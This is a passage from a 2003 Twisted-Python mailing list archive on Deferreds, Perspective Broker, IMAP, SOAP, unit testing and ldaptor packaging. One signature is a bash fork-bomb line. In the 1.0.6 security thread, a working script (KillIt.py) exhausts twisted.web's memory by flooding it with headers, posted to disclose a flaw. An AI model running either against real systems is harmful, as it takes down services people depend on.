>         deferreds.append(d)
> 
>     return defer.DefferedList(deferreds)

def onSuccess(item):
    d = item.doSomethingElseThatReturnsDeferred()
    return d

def someFunc(listOfItems):
    deferreds = []

    for item in listOfItems:
        d = doSomethingThatReturnsDeferred(item)
        d.addCallbacks(onSuccess, log.err)
        deferreds.append(d)

    return defer.DeferredList(deferreds)

-- 
:(){ :|:&};:



From justinjohnson at fastmail.fm  Thu Jul 31 16:20:24 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Thu, 31 Jul 2003 14:20:24 -0600
Subject: [Twisted-Python] Callbacks, Looping, and Variable Binding
In-Reply-To: <20030731195004.GB32069@lapdog>
References: <20030731171328.BAF3F389C1@www.fastmail.fm> <20030731195004.GB32069@lapdog>
Message-ID: <20030731202024.3E44338FCB@www.fastmail.fm>

On Thu, 31 Jul 2003 22:50:04 +0300, "Tommi Virtanen"
<tv at twistedmatrix.com> said:
> On Thu, Jul 31, 2003 at 11:13:28AM -0600, Justin Johnson wrote:
> > When I run the following code, everytime the callbacks to "onSuccess" get
> > called, "item" is bound to the last element in "list".  Obviously what I
> > want is to have "item" bound to the value it had when I added the
> > callback.  How does one handle looping constructs like this in Twisted?
> 
> 	Then don't inherit the namespace of someFunc. You could even
> 	move onSuccess outside of someFunc, to make sure you don't do
> 	that by accident.

My problem (besides just having a lot to learn) was that I was writing
the callbacks to use variables that were defined in the loop, thinking I
had no other option besides using results passed by previous callbacks. 
The results that were returned from doSomethingThatReturnsDeferred (and
thus were arguments to the next callback) were needed (not right away,
but I wanted the results to continue being passed down the callback
chain), and I wasn't aware of any other way to get "item" passed to my
callback.  However, I tried using callbackArgs to pass "item" in a tuple,
like this...

     for item in list:
         d.addCallbacks(onSuccess, log.err, callbackArgs=(item,))
         deferreds.append(d)

and then defining onSuccess like...

    def onSuccess(results, args):
        item = args[0]
        d = item.doSomethingElseThatReturnsDeferred()
        return d

Is this an acceptable way to accomplish this?  It is working in my code
but I'd like to do things the right way.

> 
> 	Besides, you are adding the outer d to deferreds once per
> 	iteration. That's broken.

I'm not sure what you mean here.  I was adding my deferred to a list and
it seemed to be doing what I wanted (at least I think it was).

Your help is appreciated.
-Justin



From justinjohnson at fastmail.fm  Thu Jul 31 16:29:45 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Thu, 31 Jul 2003 14:29:45 -0600
Subject: [Twisted-Python] Callbacks, Looping, and Variable Binding
In-Reply-To: <20030731202024.3E44338FCB@www.fastmail.fm>
References: <20030731171328.BAF3F389C1@www.fastmail.fm> <20030731195004.GB32069@lapdog> <20030731202024.3E44338FCB@www.fastmail.fm>
Message-ID: <20030731202945.126C0378E6@www.fastmail.fm>

> > 
> > 	Besides, you are adding the outer d to deferreds once per
> > 	iteration. That's broken.
> 
> I'm not sure what you mean here.  I was adding my deferred to a list and
> it seemed to be doing what I wanted (at least I think it was).
> 

To clarify, what I'm trying to do here is create a bunch of Deferred's
that aren't dependent on each other, and then put them in a DeferredList
so I can add a callback to the list which will only fire when all
Deferred's in the list are done.  Does that make sense?



From mesozoic at polynode.com  Thu Jul 31 17:02:10 2003
From: mesozoic at polynode.com (Alex Levy)
Date: Thu, 31 Jul 2003 21:02:10 +0000
Subject: [Twisted-Python] Remote PB calls in ApplicationService.stopService
Message-ID: <20030731210210.GR282@perpetual.moxn.net>

I had two programs running; one was a twistd -y instance, the other was a
simple script that received objects over Perspective Broker and printed them
out.

The -y'able application consists of one Service:

 class MyService(app.ApplicationService):
   def somePBRemoteCall(self, event):
     d = pb.getObjectAt(self.host, self.port, self.timeout)
     d.addCallback(self.foundCatcher, event)
   def foundCatcher(self, obj, event):
     d = obj.callRemote('catch', event)
   def stopService(self):
     somePBRemoteCall(i_am_dying_event)
     app.ApplicationService.stopService(self)

This isn't the code verbatim, but this is basically what it's doing. I want
the receiving side to be informed when the sending side is about to stop.

On the sending side, this results in 'Connection failed'. On the receiving
side, the following traceback appears. Could somebody more familiar with the
internals of Perspective Broker explain what's going wrong, or how I might
change my approach?

---snip---
Traceback (most recent call last):
  File "sandbox/test-catcher.py", line 15, in ?
    reactor.run()
  File "/usr/lib/python2.2/site-packages/twisted/internet/default.py", line 122, in run
    self.mainLoop()
  File "/usr/lib/python2.2/site-packages/twisted/internet/default.py", line 133, in mainLoop
    self.doIteration(t)
  File "/usr/lib/python2.2/site-packages/twisted/internet/default.py", line 472, in doSelect
    _logrun(selectable, _drdw, selectable, method, dict)
    --- <exception caught here> ---
  File "/usr/lib/python2.2/site-packages/twisted/python/log.py", line 65, in callWithLogger
    callWithContext({"system": lp}, func, *args, **kw)
  File "/usr/lib/python2.2/site-packages/twisted/python/log.py", line 52, in callWithContext
    return context.call({ILogContext: newCtx}, func, *args, **kw)
  File "/usr/lib/python2.2/site-packages/twisted/python/context.py", line 32, in callWithContext
    return func(*args,**kw)
  File "/usr/lib/python2.2/site-packages/twisted/internet/default.py", line 495, in _doReadOrWrite
    selectable.connectionLost(f)
  File "/usr/lib/python2.2/site-packages/twisted/internet/tcp.py", line 253, in connectionLost
    protocol.connectionLost(reason)
  File "/usr/lib/python2.2/site-packages/twisted/spread/pb.py", line 563, in connectionLost
    for lobj in self.remotelyCachedObjects.values():
exceptions.AttributeError: Broker instance has no attribute 'remotelyCachedObjects'
---snip---

-- 
Alex Levy
WWW: http://mesozoic.geecs.org
 
"Never let your sense of morals prevent you from doing what is right."
 -- Salvor Hardin, Isaac Asimov's _Foundation_



From andrew-twisted at puzzling.org  Thu Jul 31 21:21:30 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Fri, 1 Aug 2003 11:21:30 +1000
Subject: [Twisted-Python] the right way of unit testing protocols
In-Reply-To: <20030731194355.GA32069@lapdog>
References: <000001c356cc$3d768340$5591013d@thilakra> <20030730151039.02684534.itamar@itamarst.org> <20030731020900.GA30331@frobozz> <20030731110710.GA21641@lapdog> <20030731110307.7639a494.itamar@itamarst.org> <20030731194355.GA32069@lapdog>
Message-ID: <20030801012130.GA32720@frobozz>

On Thu, Jul 31, 2003 at 10:43:55PM +0300, Tommi Virtanen wrote:
> On Thu, Jul 31, 2003 at 11:03:07AM -0400, Itamar Shtull-Trauring wrote:
> > > 	Opening TCP sockets in unit tests is just not _unit_ testing
> > > 	in my book. Please don't do it in unit tests. It just makes it
> > > 	harder to run your unit tests in varying environments. (Who
> > > 	says I allow you to bind to port 1234? Who says it's free?
> > > 	Who says I allow you to listen *at all*?)
> > 
> > Most of Twisted's unittests listen on 0 and then figure out which port
> > was bound to. 
> 
> 	Which is mostly the reason why I'm bitch about it on _this_
> 	mailing list.
> 
> 	I dislike that method. I really do.
> 
> 	There have been _months_ during which certain twisted unit
> 	tests randomly fail; many of those have been due to
> 	interaction with local TCP stack, networking, firewall and
> 	miscellanous experimental security features.

I've *never* seen a failure due to listening on 0, either on my own
machines, or on the buildslaves, or reports on this list or IRC.  I'd be
inclined to agree with you if there was actually some evidence of a problem.

I *have* seen failures due to assuming that a *particular* port is
available, and that's definitely a no-no, because it could legitimately be
in use (especially if someone else is running tests on the same machine! :).
That's why none of the Twisted unit tests do this anymore.  Listening on 0
(as our TCP tests do, and as twisted.protocols.loopback.loopbackTCP does)
asks the OS to use any available port it likes, and I've never seen it fail.

-Andrew.




From jgoerzen at complete.org  Thu Jul 31 21:47:11 2003
From: jgoerzen at complete.org (John Goerzen)
Date: Thu, 31 Jul 2003 20:47:11 -0500
Subject: [Twisted-Python] Flag storing broke in IMAP4Client
Message-ID: <20030801014711.GA21619@complete.org>

Hello,

I have discovered what I believe to be a bug in IMAP4Client in the file
imap4.py.  I received the following traceback:

Traceback (most recent call last):
  File "/usr/lib/python2.2/site-packages/twisted/protocols/imap4.py", line 1136, in _defaultHandler
    cmd.finish(rest, self._extraInfo)
  File "/usr/lib/python2.2/site-packages/twisted/protocols/imap4.py", line 146, in finish
    self.defer.callback((send, lastLine))
  File "/usr/lib/python2.2/site-packages/twisted/internet/defer.py", line 218, in callback
    self._startRunCallbacks(result)
  File "/usr/lib/python2.2/site-packages/twisted/internet/defer.py", line 274, in _startRunCallbacks
    self._runCallbacks()
--- <exception caught here> ---
  File "/usr/lib/python2.2/site-packages/twisted/internet/defer.py", line 288, in _runCallbacks
    self.result = callback(self.result, *args, **kw)
exceptions.TypeError: __cbFetch() got an unexpected keyword argument 'lookFor'

In fact, imap4.py contains:

    def _store(self, messages, cmd, flags, uid):
        store = uid and 'UID STORE' or 'STORE'
        args = ' '.join((messages, cmd, '(%s)' % ' '.join(flags)))
        d = self.sendCommand(Command(store, args, wantResponse=('FETCH',)))
        d.addCallback(self.__cbFetch, lookFor='FLAGS')
        return d

In fact, __cbFetch is defined as:

    def __cbFetch(self, (lines, last)):

No lookfor parameter.

This is with Twisted 1.0.6.

This would likely be a problem for all IMAP commands that issues STORE to the
server: setFlags(), addFlags(), removeFlags(), etc.

-- John



From andrew-twisted at puzzling.org  Thu Jul 31 22:00:39 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Fri, 1 Aug 2003 12:00:39 +1000
Subject: [Twisted-Python] Flag storing broke in IMAP4Client
In-Reply-To: <20030801014711.GA21619@complete.org>
References: <20030801014711.GA21619@complete.org>
Message-ID: <20030801020039.GB32720@frobozz>

On Thu, Jul 31, 2003 at 08:47:11PM -0500, John Goerzen wrote:
> Hello,
> 
> I have discovered what I believe to be a bug in IMAP4Client in the file
> imap4.py.  I received the following traceback:
[...]
> This is with Twisted 1.0.6.
> 
> This would likely be a problem for all IMAP commands that issues STORE to the
> server: setFlags(), addFlags(), removeFlags(), etc.

I *strongly* recommend using either CVS or the latest alpha if you are using
IMAP.  There has been a lot of work (almost forty checkins) done on it since
1.0.6:
    http://twistedmatrix.com/users/jh.twistd/viewcvs/cgi/viewcvs.cgi/twisted/protocols/imap4.py?cvsroot=Twisted

-Andrew.




From michal at sabren.com  Tue Jul  1 06:15:51 2003
From: michal at sabren.com (Michal Wallace)
Date: Tue, 1 Jul 2003 08:15:51 -0400 (EDT)
Subject: [Twisted-Python] twistedMoin ?
In-Reply-To: <0257A723-AB73-11D7-A92B-000393C9700E@twistedmatrix.com>
Message-ID: <Pine.LNX.4.44.0307010810530.486-100000@hydrogen.sabren.com>

On Mon, 30 Jun 2003, Glyph Lefkowitz wrote:

> On Monday, June 30, 2003, at 09:02 PM, Itamar Shtull-Trauring wrote:
> 
> > Are you sure it's not people running moin as a CGI? That's what
> > twistedmatrix.com does.
> 
> Considering that the CGI support in Twisted was developed for MoinMoin 
> and Mailman, and almost all the bugfixes that made it stable were from 
> MoinMoin's maintainer, you could even say that MoinMoin+Twisted CGI 
> *is* "Twisted-enabled" MoinMoin :)

Ah, I see now. One of my customers is 
running MoinMoin on apache right now, and 
getting a TON of traffic, so I was hoping 
to switch to a non-forking version based
on twisted.

There's actually a twistedMoin.py in the 
MoinMoin distribution that works about
half way - I got a twisted server with an
embedded MoinMoin running, but there are
still some objects lying around that want
to grab state out of a global area instead
of passing the information in through a 
request object. (Unfortunately, one of
those is the bit that decides what page 
we're looking at.) I may wind up finishing
the job myself, but I thought I'd ask 
around first. :)

Sincerely,
 
Michal J Wallace
Sabren Enterprises, Inc.
-------------------------------------
contact: michal at sabren.com
hosting: http://www.cornerhost.com/
my site: http://www.withoutane.com/
--------------------------------------





From 2002 at weholt.org  Tue Jul  1 06:46:19 2003
From: 2002 at weholt.org (Thomas Weholt ( PRIVAT ))
Date: Tue, 1 Jul 2003 14:46:19 +0200
Subject: [Twisted-Python] Importing twisted.web.soap raises an exception
Message-ID: <001701c33fce$c49f4150$3ba8a8c0@gatsoft.no>

Trying to use twisted.web.soap raises an exception, saying it cannot import
SOAP-module. Why isn't this module in the distribution and where is it
located? I'm using Twisted 1.0.6.

Best regards,
Thomas




From andrew-twisted at puzzling.org  Tue Jul  1 06:54:33 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Tue, 1 Jul 2003 22:54:33 +1000
Subject: [Twisted-Python] Importing twisted.web.soap raises an exception
In-Reply-To: <001701c33fce$c49f4150$3ba8a8c0@gatsoft.no>
References: <001701c33fce$c49f4150$3ba8a8c0@gatsoft.no>
Message-ID: <20030701125433.GB17479@frobozz>

On Tue, Jul 01, 2003 at 02:46:19PM +0200, Thomas Weholt ( PRIVAT ) wrote:
> Trying to use twisted.web.soap raises an exception, saying it cannot import
> SOAP-module. Why isn't this module in the distribution and where is it
> located? I'm using Twisted 1.0.6.

As the docstring of t.w.soap says: "Requires SOAPpy."

You can find it at http://pywebsvcs.sf.net/, although I think you need to
comment out these lines in t.w.soap to make the latest version work:

    # fix 2.2 issues with SOAP
    SOAP.SOAPBuilder.dump_str = SOAP.SOAPBuilder.dump_string
    SOAP.SOAPBuilder.dump_dict = SOAP.SOAPBuilder.dump_dictionary

The docstring should probably updated to include a URL, and those lines
removed to reflect the current stable version of SOAPpy...

-Andrew.




From 2002 at weholt.org  Tue Jul  1 07:47:20 2003
From: 2002 at weholt.org (Thomas Weholt ( PRIVAT ))
Date: Tue, 1 Jul 2003 15:47:20 +0200
Subject: [Twisted-Python] Importing twisted.web.soap raises an exception
References: <001701c33fce$c49f4150$3ba8a8c0@gatsoft.no> <20030701125433.GB17479@frobozz>
Message-ID: <000501c33fd7$4b25e8c0$3ba8a8c0@gatsoft.no>

Ok, it seems to be imported without errors now, but I had to change the line

import SOAP

to

import SOAPpy as SOAP

to make it work. Tried it with SOAPpy 0.10.1.

Still, it's listed as unstable. Does anybody have any comments on the
usability of this module besides that?

Thomas


----- Original Message -----
From: "Andrew Bennetts" <andrew-twisted at puzzling.org>
To: <twisted-python at twistedmatrix.com>
Sent: Tuesday, July 01, 2003 2:54 PM
Subject: Re: [Twisted-Python] Importing twisted.web.soap raises an exception


> On Tue, Jul 01, 2003 at 02:46:19PM +0200, Thomas Weholt ( PRIVAT ) wrote:
> > Trying to use twisted.web.soap raises an exception, saying it cannot
import
> > SOAP-module. Why isn't this module in the distribution and where is it
> > located? I'm using Twisted 1.0.6.
>
> As the docstring of t.w.soap says: "Requires SOAPpy."
>
> You can find it at http://pywebsvcs.sf.net/, although I think you need to
> comment out these lines in t.w.soap to make the latest version work:
>
>     # fix 2.2 issues with SOAP
>     SOAP.SOAPBuilder.dump_str = SOAP.SOAPBuilder.dump_string
>     SOAP.SOAPBuilder.dump_dict = SOAP.SOAPBuilder.dump_dictionary
>
> The docstring should probably updated to include a URL, and those lines
> removed to reflect the current stable version of SOAPpy...
>
> -Andrew.
>
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>
>




From pb_twisted at olga.mine.nu  Tue Jul  1 07:58:34 2003
From: pb_twisted at olga.mine.nu (Patrik Blommaskog)
Date: Tue, 1 Jul 2003 15:58:34 +0200
Subject: [Twisted-Python] Controlling the classes being Jellied
Message-ID: <JAEDJDIBADCJHPFLNEDFAEELCAAA.pb_twisted@olga.mine.nu>

I'm using PB and want to accomplish something like this:

On the server, I have the following class hierarchy:

    Actor(pb.Copyable)
  
    GoodActor(Actor)
    BadActor(Actor)
    ...
    WhateverActor(Actor)

There exists a number of instances of each of these classes.

When Jellying them over to the client, I want each of them to create 
instances of the client class RemoteActor, no matter which of the server 
classes they are of. In practice, the different server classes will 
generate different state data that is transmitted to the client, where 
that state data just updates __dict__ , at least for now.

There are two things I would need input on how to accomplish:

1. I don't want to put the code for any of the server classes on the 
client just for the unjellying mapping, as they do in the PB examples. I 
think I am looking for a way to associate a class name, rather than the 
class itself, with a client-side class. E.g. { "Actor" : RemoteActor } 
instead of { Actor : RemoteActor ].

2. I would like all server classes derived from Actor be identified as 
being of class Actor when Jellied. The client should not need to know 
about any server-side child classes at all. They may not even exist at 
the time when the client is distributed.

I'd appreciate any pointers on how to do this, and also any hints if I 
seem to be thinking in the wrong direction.


- Patrik




From itamar at itamarst.org  Tue Jul  1 10:24:31 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Tue, 1 Jul 2003 12:24:31 -0400
Subject: [Twisted-Python] Importing twisted.web.soap raises an exception
In-Reply-To: <000501c33fd7$4b25e8c0$3ba8a8c0@gatsoft.no>
References: <001701c33fce$c49f4150$3ba8a8c0@gatsoft.no>
	<20030701125433.GB17479@frobozz>
	<000501c33fd7$4b25e8c0$3ba8a8c0@gatsoft.no>
Message-ID: <20030701122431.09d3cb73.itamar@itamarst.org>

On Tue, 1 Jul 2003 15:47:20 +0200
"Thomas Weholt \( PRIVAT \)" <2002 at weholt.org> wrote:

> Still, it's listed as unstable. Does anybody have any comments on the
> usability of this module besides that?

I seemed to work when I wrote it, but I dunno how interoperable SOAPpy
is.

I will try to fix it up to work with latest version, and add client
support and tests; today, or sometime this week.

In general, btw, I would recommend using XML-RPC rather than SOAP unless
you have a specific reason not to.



From dalke at dalkescientific.com  Tue Jul  1 11:52:07 2003
From: dalke at dalkescientific.com (Andrew Dalke)
Date: Tue, 1 Jul 2003 19:52:07 +0200
Subject: [Twisted-Python] ANN: Twisted 1.0.6 (includes security fixes)
In-Reply-To: <20030628235814.41d95bdc.itamar@itamarst.org>
Message-ID: <BB6429C7-ABEC-11D7-A2A0-000393C92466@dalkescientific.com>

Itamar Shtull-Trauring:
>    IMPORTANT: This release includes security updates to twisted.web.
>    It is strongly recommended that you upgrade to this version of
>    Twisted.
>

> What's New in 1.0.6
> ===================
>
> - Security fixes for twisted.web.

Was the out-of-memory denial of service attack fixed?

    
http://www.twistedmatrix.com/pipermail/twisted-python/2003-June/ 
004462.html

Looking at the code, it looks like I can still keep adding headers
until the machine exhausts memory

     def headerReceived(self, line):
         """Do pre-processing (for content-length) and store this header  
away.
         """
         header, data = line.split(':', 1)
         header = header.lower()
         data = data.strip()
         if header == 'content-length':
             self.length = int(data)
         self.requests[-1].received_headers[header] = data

					Andrew
					dalke at dalkescientific.com




From dalke at dalkescientific.com  Tue Jul  1 12:04:52 2003
From: dalke at dalkescientific.com (Andrew Dalke)
Date: Tue, 1 Jul 2003 20:04:52 +0200
Subject: [Twisted-Python] ANN: Twisted 1.0.6 (includes security fixes)
In-Reply-To: <BB6429C7-ABEC-11D7-A2A0-000393C92466@dalkescientific.com>
Message-ID: <8337B969-ABEE-11D7-A2A0-000393C92466@dalkescientific.com>

Me:
> Was the out-of-memory denial of service attack fixed?
>
>    
> http://www.twistedmatrix.com/pipermail/twisted-python/2003-June/ 
> 004462.html

Err, that code doesn't actually work (it reuses the same header names,
so there isn't a memory problem).  Here's some real attack code

===== KillIt.py
import socket
class KillIt:
   def __init__(self, where):
     self.f = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     self.f.connect(where)
     self.f.send("GET / HTTP/1.1\r\n")
     self.n = 0
   def kill(self):
     factor = 1000000
     for i in range(self.n*factor, (self.n+1)*factor):
       self.f.send("%s: X\r\n" % i)
       if i%1000 == 0: print i
     self.n += 1

=======


 >>> import KillIt
 >>> server = KillIt.KillIt( ("localhost", 8080) )
 >>> server.kill()
  ... lots of output showing that it's dumping headers ...
 >>> server.kill()
  ... each invocation takes about 50MB or so
 >>> server.kill()
  ... repeat until desired ...


					Andrew





From itamar at itamarst.org  Tue Jul  1 12:14:29 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Tue, 1 Jul 2003 14:14:29 -0400
Subject: [Twisted-Python] ANN: Twisted 1.0.6 (includes security fixes)
In-Reply-To: <BB6429C7-ABEC-11D7-A2A0-000393C92466@dalkescientific.com>
References: <20030628235814.41d95bdc.itamar@itamarst.org>
	<BB6429C7-ABEC-11D7-A2A0-000393C92466@dalkescientific.com>
Message-ID: <20030701141429.3165b8dc.itamar@itamarst.org>

On Tue, 1 Jul 2003 19:52:07 +0200
Andrew Dalke <dalke at dalkescientific.com> wrote:

> Was the out-of-memory denial of service attack fixed?

No, we fixed a more serious security bug :/

Going through http code and fixing all the DoS issues is on my todo
list.


-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From cce at clarkevans.com  Tue Jul  1 21:27:44 2003
From: cce at clarkevans.com (Clark C. Evans)
Date: Wed, 2 Jul 2003 03:27:44 +0000
Subject: [Twisted-Python] ldaptor feedback
Message-ID: <20030702032744.GA80790@doublegemini.com>

Tommi,

Howdy.  Thank you for your initial help with ldaptor; it looks like
I'll be spending alot of time on LDAP in the next few months.

1.  I would like to see ldap in twisted proper, it is really a
    core protocol (like imap, etc.).   From what I heared there are
    two arguments against, size and licensing.

    As for size, I think that LDAP is so important that it really
    belongs in twisted.   It is at the same level as IMAP.   I do not
    want to have to go to an external module, hence LDAP is in-scope
    so the size argument does not matter to me.

    As for licensing, I understand your concerns.  However, it is very
    important for enforcement of copyright and for the ability to 'fix'
    the license that a single entity have the ability to license the
    and enforce the work as needed.    Long term I'd like to see Glyph
    form some sort of non-profit to hold the copyrights, or at the
    very least present a 'will' of sorts describing what happens to
    the copyrights in the event that he is incapacitated or gets 
    hit by a MAC truck.    For now, I'm not too worried about this.
    As for Glyph selling the software and making a profit... well, 
    as a bunch of individual packages this just is not an option at
    all, so better someone than no one.   But seriously, I trust that
    Glyph will spread the wealth to those who have really contributed
    to Twisted, perhaps by simply paying for Flights and Hotels for
    Python/Twisted conference if he ever makes bank with the copyright.
    In reality though, I think that this is a moot point; the most 
    important point is the ability to fix the copyright and pursue
    violators... without copyright powers this is too hard.
    
    So, Glyph approving, would you consider contributing ldaptor
    to twisted?

2.  Your package hierarchy needs help... lots of help.
   
    Let's start with this example... 

    from ldaptor.protocols.ldap.ldapsyntax import LDAPJournalOperation_Replace

    Arg!  First, ldaptor has one protocol... ldap.  So "protocols.ldap" is
    quite redundant.  Second, ldapsyntax is describing a ldap proxy 
    object with the ability to journal its changes and save.  It has
    nothing to do with "syntax" let alone "ldapsyntax", how about 
    'object' or 'proxy'?.  Third, I count 3 occurances of LDAP... Uncle!  
    Fourth, the class name is *huge* and using prefixes this way sucks, 
    JournalOperations should be in a file called 'journal'.    In short, 
    what I'd want to see...

       from ldaptor import ldap
       op = ldap.journal.Replace()

    The 'low-level' pureber and pureldap are really not protocol
    items so much as they are parsers/emitters.  You could stuff
    these, as well as the filter, ldif, and schema all into 
    another part of ldaptor, ldaptor.parse.ldif, etc.

    Anyway, for ldaptor to be understandable it really needs a 
    refactor like this.   Just look at your commands as to how
    ugly the packaging is.   Good packaging and naming takes quite
    a bit of effort and thought.

3.  I can help convert your public interfaces to use Deferreds, and I 
    can rewrite your examples to use flow (so that they are more
    readable).    In particular, I was playing with a flow version
    of your ldap client and it makes things quite clean; to use
    the client you have a generator which yield ldap commands...

    If I'm to help, I'll need commit access and you can't be 
    completely opposed to me restructuring/commenting things as
    I move along.   If you need an example of my work, see flow.py

Anyway, I'm curious how open you are to these items.   Adding this to
Twisted (with alot of work) is probably a good bargin; you get more
eyes helping your project along, documentation, etc.  

Best,

Clark



From illumen at yahoo.com  Wed Jul  2 00:06:04 2003
From: illumen at yahoo.com (Rene Dudfield)
Date: Wed, 02 Jul 2003 16:06:04 +1000
Subject: [Twisted-Python] windows binary install.
In-Reply-To: <20030702032744.GA80790@doublegemini.com>
References: <20030702032744.GA80790@doublegemini.com>
Message-ID: <3F02764C.3010600@yahoo.com>

Hello,

I tried to install the windows binary install today, and there was an error.

Is it possible to not require win32api?  Maybe win32api should be on a 
list of dependencies on the download page?


Here's the error:
Installing Icons for Twisted...
Traceback (most recent call last):
File "C:\Python22\Scripts\twisted_postinstall.py", line 269, in ?
      run()
        File "C:\Python22\Scripts\twisted_postinstall.py", line 70, in run
            whocares=install()
              File "C:\Python22\Scripts\twisted_postinstall.py", line 
179, in install
                  if not runtime.platform.isWinNT():
                    File 
"C:\Python22\Lib\site-packages\twisted\python\runtime.py", line 52, in 
isWinNT
                        import win32api, win32con
                        ImportError: No module named win32api
                        *** run_installscript: internal error 0xFFFFFFFF ***






From tv at twistedmatrix.com  Wed Jul  2 00:35:20 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Wed, 2 Jul 2003 09:35:20 +0300
Subject: [Twisted-Python] ldaptor feedback
In-Reply-To: <20030702032744.GA80790@doublegemini.com>
References: <20030702032744.GA80790@doublegemini.com>
Message-ID: <20030702063520.GA24397@lapdog>

On Wed, Jul 02, 2003 at 03:27:44AM +0000, Clark C. Evans wrote:
> 1.  I would like to see ldap in twisted proper, it is really a
>     core protocol (like imap, etc.).   From what I heared there are
>     two arguments against, size and licensing.
> 
>     As for size, I think that LDAP is so important that it really
>     belongs in twisted.   It is at the same level as IMAP.   I do not
>     want to have to go to an external module, hence LDAP is in-scope
>     so the size argument does not matter to me.

	IMAP is <4200 lines with tests, and I believe it is expected
	to be pretty complete protocol, including client and server
	sides. Ldaptor is already almost three times that big,
	client-only, and is still only scratching the surface.

	LDAP is not really used commonly enough to bloat the twisted
	core with it. (Quick! Name three end user applications using
	LDAP!)

	If you think installing two libraries instead of one is too
	hard, you need to get a better OS ;)

>     As for licensing, I understand your concerns.  However, it is very
>     important for enforcement of copyright and for the ability to 'fix'
>     the license that a single entity have the ability to license the
>     and enforce the work as needed.    Long term I'd like to see Glyph
>     form some sort of non-profit to hold the copyrights, or at the
>     very least present a 'will' of sorts describing what happens to
>     the copyrights in the event that he is incapacitated or gets 
>     hit by a MAC truck.    For now, I'm not too worried about this.

	I think we as the community don't need anything better than
	LGPL.

>     As for Glyph selling the software and making a profit... well, 
>     as a bunch of individual packages this just is not an option at
>     all, so better someone than no one.

	I don't feel that way. And most of all, I am not willing to
	delegate that power when it comes to my creation.

	Besides, glyph's major point on that was the game industry.
	I'm betting they will not be interested in LDAP.

>     So, Glyph approving, would you consider contributing ldaptor
>     to twisted?

	No, you are missing the point. That was the starting point;
	if I had been happy with that I would never have moved the
	code from Twisted to Ldaptor.

> 2.  Your package hierarchy needs help... lots of help.

	Agreed.

>     Let's start with this example... 
> 
>     from ldaptor.protocols.ldap.ldapsyntax import LDAPJournalOperation_Replace
>
>     Arg!

	You never do that.

	1. s/from foo.bar import OneClass/from foo import bar/

	2. users of the API never need to touch LDAPJournalOperations,
	   or even the journal itself.

	The current situation looks more like

	from ldaptor.protocol.ldap import ldapsyntax

	o = ldapsyntax.LDAPObject(..)

	which is within the limits of what my emacs is willing to
	dabbrev-expand. Most of the time you just do things like

	d = o.search(...)
	d.addCallback(foo)

>     First, ldaptor has one protocol... ldap.  So "protocols.ldap" is
>     quite redundant.

	There's likely to be LDAPv4. LDAP protocol versions aren't really
	compatible.

	I think LDIF-as-a-replication format is a protocol.

	There's LDUP, the LDAP replication protocol, but that's probably
	just a superset of LDAPv3.

	I think I may end up supporting LDAP-over-UDP, if the standard
	is stable.

	What's really making you grit your teeth is that the mechanism
	an LDAP client uses to open a connection to an LDAP server should
	be in ldaptor.client; and it will be, once I have a clear idea
	what the API should look like. For now, you need to make your own
	subclass of ldapclient.LDAPClient, a Protocol, even if you
	only override *1* method of it! And, remember what I said, everything
	in ldapclient is the old, ugly, API.

	In the future, it'll look more like

	from ldaptor import client

	d=client.openDN('dc=example,dc=com')
	d.addCallback(lambda o: o.search('cn=foo'))

	and you won't need to import the low-level things.

>     Second, ldapsyntax is describing a ldap proxy 
>     object with the ability to journal its changes and save.  It has
>     nothing to do with "syntax" let alone "ldapsyntax", how about 
>     'object' or 'proxy'?.

	Yes, the word syntax is bad. It dates back to the time I tried to
	make the data in LDAP be manipulatable as Python objects, from the
	days before Twisted.

	I refuse to name a class "Object". I refuse to name a class
	"Proxy".

	Besides, I'm a TCP/IP person. To me, a proxy is a thing that
	intermediates between two (different or the same) protocols,
	not something that is really a client-side state for a
	networking API.

>     Third, I count 3 occurances of LDAP... Uncle!

	You purposefully imported the lowest-level thing you could find.
	I could care less how ugly that seems to you. You are not supposed
	to touch that. Internal consistency matters more than shortness
	of the names.

>     Fourth, the class name is *huge* and using prefixes this way sucks, 
>     JournalOperations should be in a file called 'journal'.    In short, 
>     what I'd want to see...
> 
>        from ldaptor import ldap
>        op = ldap.journal.Replace()

	Class named Replace? That way leads to insanity, IMHO.
	What does it replace? With what? Where? Remember, you are
	talking about an implementation detail users of the library
	should never see.

>     The 'low-level' pureber and pureldap are really not protocol
>     items so much as they are parsers/emitters.  You could stuff
>     these, as well as the filter, ldif, and schema all into 
>     another part of ldaptor, ldaptor.parse.ldif, etc.

	There are two things in a protocol:

	1. the wire representation of things
		ldaptor.protocols.pureber
		ldaptor.protocols.pureldap

	2. the state machine
		ldaptor.protocols.ldap.ldapclient
		ldaptor.protocols.ldap.ldapsyntax

	(often #1 is so simple it's not implemented separately)

	The wire representation of the LDAP messages is never
	written to a file, so there's no use for it outside of
	the protocol scope.

	Filter and ldif need to move some day. They started life
	as residing inside the neighbouring .py files, and were
	split out when they grew too big; moving them should be
	reasonably trivial.

	schema needs to be split into pure-ASCII-parser
	(ldaptor.schema?) and the state machine to fetch the used
	schema from the server over LDAP (which should be refactored
	to use LDAPObjects).

>     Anyway, for ldaptor to be understandable it really needs a 
>     refactor like this.   Just look at your commands as to how
>     ugly the packaging is.   Good packaging and naming takes quite
>     a bit of effort and thought.

	Agreed.

> 3.  I can help convert your public interfaces to use Deferreds, and I 
>     can rewrite your examples to use flow (so that they are more
>     readable).    In particular, I was playing with a flow version
>     of your ldap client and it makes things quite clean; to use
>     the client you have a generator which yield ldap commands...

	Thank you for that.

	Please, no flow rewrites for Ldaptor as of now; when flow has
	been in use in Twisted core protocols for ~ 3 months, we can
	talk again.

>     If I'm to help, I'll need commit access and you can't be 
>     completely opposed to me restructuring/commenting things as
>     I move along.   If you need an example of my work, see flow.py

	I think we got a good start on that in IRC.

	I hope to make ldaptor cleaner and clearer. Any help from
	you is welcome.

	Of course, I still get to review your changes and bitch about
